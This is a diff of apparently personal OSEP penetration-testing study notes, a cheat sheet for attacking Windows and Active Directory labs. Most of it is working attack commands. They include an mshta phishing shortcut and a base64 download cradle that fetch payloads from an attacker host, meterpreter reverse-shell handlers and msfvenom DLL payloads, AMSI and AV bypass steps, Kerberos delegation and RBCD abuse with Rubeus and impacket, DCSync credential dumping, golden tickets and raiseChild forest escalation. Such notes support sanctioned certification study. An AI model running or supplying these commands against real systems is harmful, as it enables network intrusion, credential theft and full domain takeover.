@@ -1,28 +1,33 @@
 `https://steflan-security.com/offensive-security-experienced-penetration-tester-osep-review/`
 
 # todo
-- add adpeas and adpeas-Light
-- take useful commands from lab writeups to navi cheatsheets
-- test sharphound in memory with powershell
 - sectioned shellcode runner
-- test python bloodhound on challenge 5 main repo doesn't do kerberos yet use https://github.com/jazzpizazz/BloodHound.py-Kerberos
-- https://github.com/eladshamir/Whisker Shadow Credentials?
 - update osep-code-snippets with code for turning on RPC (challenge 6)
+- oscp to navi
 - asciinema prep
 # playbook
-- upload payload with AV bypass (bypass AV)
+- upload payload with AV bypass (bypass AV) and generated self-signed certs
 - migrate to a different process (process injection via meterpreter)
 - shell > powershell (Bypass-AMSI)
 - alternatively build msbuild xml files you want to run on the system
 - perform post exploit enumeration (winpeas-memory/Invoke-Seatbelt)
-- perform active directory enumeration (powerview.ps1/SharpHound.ps1)
+	- cat \\Windows\\System32\\Drivers\\etc\\hosts
+	- check custom webapp files for credentials
+	- linux: pspy
+	- nmap or naabu from pivot
+	- use cme to quickly enumerate hostnames with IP
+- perform active directory enumeration (adPEAS.ps1/powerview.ps1/SharpHound.ps1)
 	- note down high value targets (domain admin)
 	- manually search for unconstrained delegation
+	- if you notice multiple domain names try enumerating [[#enumerate other forest]]
 - privesc (then privesc again to SYSTEM if you are local admin that wants AD access)
 - disable defences
-- after getting system shell migrate to spoolsv
+- after getting system shell migrate to spoolsv or svchost.exe
 - use incognito to switch to a user targeted by AD enumeration
-
+- see [[#extra SIDs (privesc child domain admin to enterprise admin)]] to privesc to enterprise admin
+- lateral
+	- after getting creds use cme or impacket-rdp_check to test creds 
+	- winrm: try admins of each domain on a machine that you cannot determine its what domain it belongs to
 # proxy
 - the Meterpreter HTTP and HTTPS payloads are proxy-aware
 - the Net.WebClient download cradle is by default proxy-aware
@@ -537,7 +542,7 @@ cat SuperSharpShooter/output/test.js | xclip -selection clipboard
 C:\Windows\System32\mshta.exe \path\to\test.hta
 
 # in windows: create a shortcut (clickme.lnk) file with the path:
-C:\Windows\System32\mshta.exe http://192.168.49.102\test.hta
+C:\Windows\System32\mshta.exe http://192.168.45.173\test.hta
 
 # attach to email or soceng victim to click link
 ```
@@ -1070,10 +1075,8 @@ msf6 auxiliary(server/socks_proxy) > exploit -j
 sudo cp /etc/proxychains4.conf /etc/proxychains.conf
 sudo vim /etc/proxychains.conf
 
-# edit the very bottom line from
-socks4  127.0.0.1 9050
-# to
-socks5 127.0.0.1 1080
+# edit the very bottom line from socks4  127.0.0.1 9050 to socks5 127.0.0.1 1080
+sudo sed -i 's/socks4       127.0.0.1 9050/socks5 127.0.0.1 1080/' /etc/proxychains.conf
 
 # proxy in
 proxychains rdesktop 192.168.164.10
@@ -1177,6 +1180,8 @@ Host *
         ControlPath ~/.ssh/controlmaster/%r@%h:%p
         ControlMaster auto
         ControlPersist 10m
+# alternatively
+sed -i 's/ControlPersist no/ControlPersist yes/' ~/.ssh/config
 
 chmod 644 ~/.ssh/config
 mkdir ~/.ssh/controlmaster
@@ -1463,7 +1468,7 @@ conStr = "SERVER=localhost;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music";
 # requires simple_shellcode_runner/simple_shellcode_runner.ps1 as run.txt
 sudo systemctl stop smbd nmbd  
 python3 -m http.server 80
-sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.45.197; set lport 443; exploit"
+sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST tun0; set lport 443; exploit"
 kali@kali:~$ pwsh
 PS /home/kali> $text = "(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/run.txt') | IEX"
 PS /home/kali> [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
@@ -1481,6 +1486,8 @@ C:\Users\admin.CORP1>MSSQL.exe
 String res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);  
 # method 2: EXECUTE AS USER dbo
 String res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
+
+# sometimes you have to hunt down the a completely different user to impersonate
 ```
 ## code execution
 `OSEP-Code-Snippets/MSSQL`
@@ -1620,10 +1627,14 @@ net group testgroup offsec /add /domain
 
 ```
 # WriteDACL
-# scenario: user prod\offsec has WriteDACL on user prod\TestService2
-# example of WriteDACL abuse to give GenericAll to user testservice2
+# example 1: user prod\offsec has WriteDACL on user prod\TestService2
 Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
-# note offsec will have generic all access to testservice2
+# note offsec will have generic all access to testservice2; you will need to abuse the GenericAll privileges
+
+# example 2: user sqlsvc has WriteDACL over the MailAdmins Group
+Add-DomainObjectAcl -TargetIdentity MailAdmins -PrincipalIdentity sqlsvc -Rights All
+# note sqlsvc will have generic all access to MailAdmins group; you will need to abuse the GenericAll privileges
+net group MailAdmins sqlsvc /add /domain
 
 # verify updated permission
 Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
@@ -1677,6 +1688,9 @@ Invoke-Mimikatz -Command 'privilege::debug "sekurlsa::tickets /export"'
 # ls to see all the tickets and find the one that matches your target
 Invoke-Mimikatz  -Command '"kerberos::ptt [0;10a3f5]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi"'
 C:\Tools\SysinternalsSuite\PsExec.exe /accepteula \\cdc01 cmd
+
+# troubleshooting
+- if you have imported the ticket and for some reason you can't move laterally you will need to run commands via powershell and not cmd
 ```
 ### semi-auto approach
 force dc to connect to application service using SpoolSample.exe
@@ -1807,9 +1821,21 @@ python3 printerbug.py -hashes aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683
 
 export KRB5CCNAME=/home/kali/osep/krbrelayx/'CDC01$@PROD.CORP1.COM_krbtgt@PROD.CORP1.COM.ccache'
 
+sudo vim /etc/resolv.conf 
+# comment out default records
+search CDC01.prod.corp1.com
+nameserver 192.168.178.70
+# you need to add the domain into the DC entry as well
+sudo vim /etc/hosts
+192.168.179.100 dc01 corp.com
+
 # perform dcsnyc attack with secretsdump
 impacket-secretsdump -k <dc_fqdn> -just-dc
 impacket-secretsdump -k CDC01.prod.corp1.com -just-dc
+
+# revert /etc/resolv.conf before continuing
+
+Note: Since the DNS server can be reached directly from Kali Linux in this case, adding the DNS IP address to /etc/resolv.conf will help resolve the required hostnames in the domain and make sure that Kerberos authentication still works.
 ```
 
 ```
@@ -1846,7 +1872,7 @@ useraccountcontrol       : ..., TRUSTED_TO_AUTH_FOR_DELEGATION <-- indication of
 ```
 # obtain creds (plaintext or hash) of user with TRUSTED_TO_AUTH_FOR_DELEGATION
 # scenario specific: generate the NTLM hash from KNOWN plain text password for IISSvc user
-$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/win/rubeus.txt')
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("hash /password:lab".Split())
 
@@ -1875,8 +1901,39 @@ $content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.2
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("purge".Split())
 # use mimikatz to dump lsass then continue below
-[Rubeus.Program]::Main("s4u /user:web01$ /rc4:b8cdd27f8218f12b4a49b7e06db340b6 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
+[Rubeus.Program]::Main("s4u /user:web01$ /rc4:b8cdd27f8218f12b4a49b7e06db340b6 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt /outfile:c:\windows\tasks\kirbi.txt /nowrap".Split())
 klist
+```
+
+```
+# example 3: constrained delegation with impacket
+# scenario specific: we've obtained a NTLM hash of our IISSvc account that has constrained delegation to MSSQL SPN
+
+sudo vim /etc/resolv.conf
+# comment out old records
+search dc01.corp.com
+nameserver 192.168.179.100
+sudo vim /etc/hosts
+...
+192.168.179.100	dc01 corp.com
+192.168.179.102	sql01.corp.com
+
+impacket-getTGT corp.com/iissvc -hashes :12bb0b468b42c76d48a3a5ceb8ade2e9
+export KRB5CCNAME=iissvc.ccache
+impacket-getST -spn mssqlsvc/sql01.corp.com:1433 -impersonate administrator corp.com/iissvc -k -no-pass
+export KRB5CCNAME=administrator.ccache
+impacket-mssqlclient sql01.corp.com -k
+SQL (CORP\Administrator  dbo@master)> enable_xp_cmdshell
+[*] INFO(SQL01\SQLEXPRESS): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(SQL01\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (CORP\Administrator  dbo@master)> xp_cmdshell whoami
+output        
+-----------   
+corp\sqlsvc   
+
+NULL          
+
+SQL (CORP\Administrator  dbo@master)>
 ```
 ## kerberos resource-based contrained delegation
 ```
@@ -1890,39 +1947,31 @@ klist
 - Rubeus.exe -> rubeus.txt
 
 # enumerate for GenericWrite
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' } | Format-Table Identity, ObjectDN, ActiveDirectoryRights -Wrap
+# alternatively
 Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | Format-Table Identity, ObjectDN, ActiveDirectoryRights -Wrap
-...
-ObjectDN              : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
-ActiveDirectoryRights : ..., GenericWrite
-...
-Identity              : PROD\dave
-...
+
+# likely chance of of rbcd attack from adpeas:
+[+] Filtering found identities that can add a computer object to domain 'ops.comply.com':
+[!] The Machine Account Quota is currently set to 10
+[!] Every member of group 'Authenticated Users' can add a computer to domain 'ops.comply.com'
 
 # in this scenario dave has GenericWrite on APPSRV01
 # option 1: obtain the password hash of a computer account
 # option 2: create a new computer account object with a selected password using PowerMad.ps1
-# https://github.com/Kevin-Robertson/Powermad
 # verify the number of new computer accounts that can be created and added to the domain 
 Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
-# use PowerMad.ps1 to create new computer account
-. .\powermad.ps1
-New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
-# verify creation
-Get-DomainComputer -Identity myComputer
+# use PowerMad.ps1 to create and verify creation of new computer account
+New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force); Get-DomainComputer -Identity myComputer
 
 # generate SID for computer account
-$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
-$SDbytes = New-Object byte[] ($SD.BinaryLength)
-$SD.GetBinaryForm($SDbytes,0)
+$sid = Get-DomainComputer -Identity myComputer | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"; $SDbytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDbytes,0)
 
 # as dave, assign SID of machine account to msDS-AllowedToActOnBehalfOfOtherIdentity on APPSRV01
 Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 
 # verify
-$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
-$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
-$Descriptor.DiscretionaryAcl
+$RBCDbytes = Get-DomainComputer appsrv01 | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0; $Descriptor.DiscretionaryAcl
 ...
 SecurityIdentifier : S-1-5-21-3776646582-2086779273-4091361643-2101
 ...
@@ -1935,11 +1984,48 @@ $content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.1
 $content = (Invoke-WebRequest -Uri "http://192.168.45.197/rubeus.txt").Content
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("hash /password:h4x)
-[Rubeus.Program]::Main("s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt)
+[Rubeus.Program]::Main("s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt /outfile:c:\windows\tasks\kirbi.txt /nowrap".split())
 
 # verify and continue attack chain
 klist
 dir \\appsrv01.prod.corp1.com\c$
+```
+
+
+```
+# example 2: rbcd via impacket
+# specific scenario: mary has GenericWrite on BACKUP01 and we have her NTLM hash
+
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+# alternatively: impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'Password1234' -dc-ip 172.16.214.165 complyedge/jim:Password1234
+impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
+impacket-psexec administrator@backup01.corp.com -k -no-pass
+```
+# Just Enough Administration (JEA)
+```
+# view powershell history
+type $((Get-PSReadlineOption).HistorySavePath)
+
+# scenario: we a command that infers powershell remoting is used
+# remote via winrm
+Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02
+# alternatively
+Enter-PSSession -ComputerName sql01 -Credential robert -ConfigurationName j_sql
+
+# view available commands in retricted sessions
+Get-Command
+
+# if we can use Copy-Item then we can perform dll highjacking
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -a x64 --platform windows -f dll -o msasn1.dll
+
+# breakout 1
+& {whoami}
+
+# breakout 2
+function Do-Stuff {
+    Get-Content c:\users\administrator\desktop\proof.txt
+}
 ```
 # forest
 ```
@@ -1966,9 +2052,6 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /domain:prod.corp1.com /user:corp1$"'
 SAM Username         : CORP1$
 Account Type         : 30000002 ( TRUST_ACCOUNT )
 User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
-...
-Credentials:
-  Hash NTLM: 4b6af2bf64714682eeef64f516a08949
 ...
 
 # force a replication of the password hash for the krbtgt account
@@ -1998,7 +2081,7 @@ c:\tools\SysinternalsSuite\PsExec.exe /accepteula \\rdc01 cmd
 whoami /groups
 # continue attack chain
 ```
-
+see also [[#via impackets raiseChild]]
 ## spoolsample (privesc: child domain admin to enterprise admin)
 ```
 # using spoolsample
@@ -2041,25 +2124,26 @@ Credentials:
 sudo vim/etc/hosts is updated
 impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e administrator@rdc01.corp1.com
 ```
-
 ## enumerate other forest
 ```
 # enumerating from the perspective of user from the prod.corp1.com domain
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
 
 # with powerview
-IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/powerview.ps1")
-Get-DomainTrust -Domain corp1.com
-Get-DomainTrustMapping
+Get-DomainTrust -Domain <other_domain_than_the current_one>
+Get-DomainTrustMapping | select SourceName, TargetName, TrustDirection
 
 # enumerate users on a different domain that is trusted
 Get-DomainUser -Domain corp2.com
 Get-DomainUser -Domain corp2.com | select samaccountname, distinguishedname
+```
 
+```
 # possible attack vector: if two users with the same name exist on different domains then they MAY use the same password
+# scenario: a user in prod.corp1.com may be a member of a group in corp2.com
 
-# discover any groups inside our current forest that have members that originate from corp2.com
-# scenario: user in prod.corp1.com may be a member of a group in corp2.com
+# Get-DomainForeignGroupMember: discover any groups at target domain that have members that originate from a foreign domain
+Get-DomainForeignGroupMember -Domain <other_domain_than_the current_one>
 Get-DomainForeignGroupMember -Domain corp2.com
 ...
 GroupName               : myGroup2
@@ -2068,9 +2152,8 @@ MemberName              : S-1-5-21-3776646582-2086779273-4091361643-1601
 ...
 
 
-convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601
+ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-1601
 ```
-
 ## extra SIDs (privesc: one forest admin to another forest admin)
 ```
 # in powershell as domain admin dcsync to get krbtgt hash
@@ -2089,11 +2172,20 @@ Get-DomainSID -domain corp2.com
 S-1-5-21-3759240818-3619593844-2110795065
 
 Invoke-Mimikatz -Command '"kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-3759240818-3619593844-2110795065-519 /ptt"'
+
+# sometimes it won't work so use raiseChild instead
 ```
-via impackets raiseChild
+### via impackets raiseChild
 ```
-impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>
-impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>:'<PASS>'
+# if using proxychains comment out proxy_dns in /etc/proxychains.conf
+# also you want to edit your /etc/hosts becuase raiseChild is temperamental with resolving domains and hostnames
+sudo vim /etc/hosts
+...
+<CHILD_DC_IP> <CHILD_DC_HOSTNAME>.<CHILD_FQDN> 
+<ROOT_DC_IP> <ROOT_DC_HOSTNAME>.<ROOT_FQDN> <ROOT_FQDN> 
+
+impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<CHILD_ADMIN_USER>
+impacket-raiseChild <CHILD_DOMAIN>/<CHILD_ADMIN_USER>:'<PASS>'
 ```
 ### Troubleshooting
 ```
